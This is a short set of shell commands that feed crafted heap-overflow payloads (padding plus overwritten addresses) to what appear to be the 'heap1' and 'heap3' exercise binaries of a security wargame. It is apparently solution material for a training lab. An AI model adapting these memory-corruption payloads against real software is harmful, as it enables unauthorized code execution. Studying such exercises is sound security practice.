./heap1 $(python -c 'print "A"*20+"\x74\x97\x04\x08"') $(python -c 'print "\x94\x84\x04\x08"')



./heap3 r `python -c 'print "A"*4'` `python -c 'print "B"*40+"\x1c\xB1\x04\x08"'` `python -c 'print "\x64\x88\x04\x08"'`
